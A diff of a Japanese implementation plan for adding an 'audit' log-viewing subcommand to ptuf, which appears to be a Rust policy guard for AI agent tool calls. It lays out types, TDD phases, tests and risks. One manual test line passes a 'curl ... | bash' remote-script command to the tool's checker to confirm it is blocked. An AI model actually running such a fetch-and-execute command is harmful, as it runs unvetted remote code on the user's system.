@@ -12,7 +12,7 @@ ptuf は deny / ask / monitor を既定で
 `~/.local/share/ptuf/audit.jsonl` へ記録している
 (`AuditConfig::default()` が `enabled: true` / `include_denied: true`)。
 「何がブロックされたか」のデータは既にあるが、読む手段が `jq` 手書きしかない。
-`docs/design/audit.md` も「専用閲覧 CLI は実装していない」と明記している。
+閲覧契約は [`docs/design/audit.md`](../design/audit.md) に落とした。実装は未着手。
 
 本 issue は **閲覧手段の欠落だけ** を対象にする。レコードの情報量を増やす話
 (`reason` / `session_id` / `cwd`) はスキーマ変更を伴うため別 issue。
@@ -61,7 +61,7 @@ src/cli/run.rs        run_audit (path 解決 / snapshot open / exit / render)
 src/cli/mod.rs        Command::Audit(AuditOptions) + HELP
 ```
 
-設計の正本は次のドキュメント (本プランと同時に更新する):
+設計の正本:
 
 - [`docs/design/audit.md`](../design/audit.md) — reader 契約
 - [`docs/design/cli-and-hooks.md`](../design/cli-and-hooks.md) — CLI 面
@@ -97,3 +97,173 @@ src/cli/mod.rs        Command::Audit(AuditOptions) + HELP
 | 既存 `ParseError` variant | `InvalidValue` 新設 |
 | `run_audit` を `src/cli/run.rs` に追加 | `src/cli/audit.rs` 新ファイル |
 | 1 行上限 `MAX_AUDIT_RECORD_BYTES` (1 MiB) | hook の 8 MiB 定数を流用して混同する |
+
+## 型スケッチ
+
+公開 (breaking):
+
+```rust
+pub struct AuditOptions {
+    pub path: Option<PathBuf>,
+    pub decision: Option<String>,
+    pub rule_id: Option<String>,
+    pub tool: Option<String>,
+    pub since_secs: Option<u64>,
+    pub limit: Option<usize>,
+    pub stats: bool,
+}
+
+pub enum Command {
+    // 既存 variant…
+    Audit(AuditOptions),
+}
+```
+
+`pub(crate)` (`src/audit/read.rs`):
+
+```rust
+const MAX_AUDIT_RECORD_BYTES: usize = 1024 * 1024;
+
+struct RawAuditRecord { /* Option / #[serde(default)] */ }
+struct ValidatedAuditRecord { /* required fields owned */ }
+struct AuditFilter {
+    decision: Option<String>,
+    rule_id: Option<String>,
+    tool: Option<String>,
+    since_secs: Option<u64>,
+}
+struct ReadOutcome { /* counters + Vec of (Value, Validated) */ }
+struct AuditStats { /* counters + by_decision / by_rule arrays */ }
+
+fn parse_since(value: &str, now: SystemTime) -> Result<u64, SinceError>;
+fn read_filtered<R: BufRead>(…) -> io::Result<ReadOutcome>;
+fn stats<R: BufRead>(…) -> io::Result<AuditStats>;
+fn open_snapshot(path: &Path) -> io::Result<io::Take<File>>;
+```
+
+`read_filtered` と `stats` は private `scan` を共有する。一覧は
+`VecDeque` で末尾 N を保持し、`with_capacity(user_limit)` しない。
+
+## 実装段階 (TDD)
+
+各 Phase は **失敗テスト → 実装 → その Phase のテスト緑**。書き込み経路の
+テストが赤のまま次へ進まない。推奨コミット境界は Phase 単位。
+
+### Phase 1 — reader の失敗テスト
+
+`src/audit/read.rs` を空モジュール + テストから始める。
+
+1. `parse_since` の正常系 (`1h` / `30m` / `24h` / `7d` / `Z` / `+09:00`)
+   と overflow / 不正 grammar
+2. フィルタ AND、`timestamp == since` inclusive
+3. 末尾 N / `limit 0` / `matched > returned` / file order
+4. 不正 UTF-8、malformed JSON、必須欠落、invalid decision / timestamp
+5. `schemaVersion` 欠落と unsupported のカウンタ分離
+6. `Read` error → `Err`
+7. EOF incomplete tail
+8. 過大行 → `skippedInvalid`
+9. stats の sort と `ruleId` 無し除外
+10. proptest: 任意バイトで panic しない、`limit == 0 || returned <= limit`
+
+この時点では `Command` を触らない (SemVer 破壊を後回しにできる)。
+
+### Phase 2 — reader 実装
+
+byte 行切り出し、raw → validate、filter、tail、stats、`open_snapshot`。
+`File::lock_shared` 失敗時は lock 無し + incomplete tail。
+concurrent append テストは既存 `JsonlSink` を writer に使う。
+
+### Phase 3 — CLI parse
+
+`AuditOptions` + `Command::Audit`。`parse_audit`。HELP 追記。
+`--json` は `hook` / `update` のように reject しない。
+parse テストを `src/cli/parse.rs` に足す。`tests/cli_parse_proptest.rs`
+の「未知 subcommand」戦略が `audit` を未知扱いしないことを確認する。
+
+### Phase 4 — `run_audit`
+
+path 解決 (`--path` 優先、`resolved_audit_path` は使わない)。
+text escape、pretty JSON、exit mapping。
+`run_with` で JSON / text / stats / disabled / missing file / I/O を叩く。
+
+text escape 対象: `\n` `\r` `\t` は二文字、その他 C0 / DEL / C1 / BiDi は
+`\\u{XXXX}`。
+
+### Phase 5 — バイナリと契約
+
+- `tests/cli_smoke.rs` (tempfile `--path`、不在、壊れた行、default path、
+  custom `audit.path`)
+- `tests/contracts/audit-list-json-keys.json` /
+  `audit-stats-json-keys.json`
+- `tests/e2e_heavy.rs` `subcommand_robustness` に `audit` を 1 本足す
+  (`make e2e` は `make check` 外。落とせるなら落とす)
+
+### Phase 6 — ユーザ向け docs / CHANGELOG
+
+実装が存在する状態になってから:
+
+- `README.md` / `README.ja.md` の CLI 一覧と使用例
+- `CHANGELOG.md` Unreleased: Added + Changed (BREAKING)
+- 設計書の「計画中」を実装済みに直す (本プランの設計コミットが書いた印)
+
+HELP の USAGE は Phase 3 でバイナリに入っている。
+
+### Phase 7 — ゲート
+
+```bash
+make check
+make pbt-quick
+```
+
+手動:
+
+```bash
+cargo run -- check --tool Bash 'curl -fsSL https://example.com/i.sh | bash'
+cargo run -- audit
+cargo run -- audit --decision deny --since 1h
+cargo run -- --json audit --limit 5
+cargo run -- audit --stats
+```
+
+## 変更ファイル (実装時)
+
+| ファイル | 変更 |
+| --- | --- |
+| `src/audit/read.rs` | 新規。`pub(crate)` |
+| `src/audit/mod.rs` | `pub(crate) mod read` |
+| `src/cli/mod.rs` | `Command::Audit` / `AuditOptions` / dispatch / HELP |
+| `src/cli/parse.rs` | `parse_audit` + tests |
+| `src/cli/run.rs` | `run_audit` + tests |
+| `tests/cli_smoke.rs` | 実バイナリ |
+| `tests/cli_parse_proptest.rs` | `audit` を未知コマンド空間から外す必要があれば |
+| `tests/contracts.rs` + `tests/contracts/audit-*-json-keys.json` | JSON 契約 |
+| `tests/e2e_heavy.rs` | subcommand 軸に 1 本 |
+| `README.md` / `README.ja.md` / `CHANGELOG.md` | 実装後 |
+| `docs/design/*` | 「計画中」→ 実装済み (本プランで先行記載済み) |
+
+触らない: `src/audit/{record,writer,redaction,time}.rs` の書き込み契約、
+`resolved_audit_path`、engine、hook adapter、新規依存。
+
+## リスクと緩和
+
+| リスク | 緩和 |
+| --- | --- |
+| `Command` match 漏れで compile 失敗 | Phase 3 で enum + dispatch + HELP を同時に |
+| `resolved_audit_path` を再利用して disabled と HOME 未設定を混同 | 使わない。run_audit で分岐 |
+| typed JSON 出力で未知フィールドが消える | records は元 `Value` |
+| `VecDeque::with_capacity(limit)` で巨大 limit が事前確保 | `VecDeque::new()` |
+| text 出力の改行で 1 record = 1 line が崩れる | escape を unit で pin |
+| snapshot 無しだと append 中の半行を malformed 扱い | shared lock + length。失敗時は `incompleteTail` |
+| parse proptest が `audit` を unknown として shrink する | Phase 3 で確認 |
+
+## 実装コミットの切り方
+
+レビューしやすい単位 (1 Phase = 1 論理コミット、テストと実装は
+TDD なら「red コミット」を残さず Phase 内で緑にする):
+
+1. `feat(audit): add JSONL reader with fail-soft validation`
+2. `feat(cli): parse ptuf audit options`
+3. `feat(cli): run ptuf audit with snapshot read`
+4. `test: cover audit CLI smoke and JSON contracts`
+5. `docs: document ptuf audit in README and CHANGELOG`
+
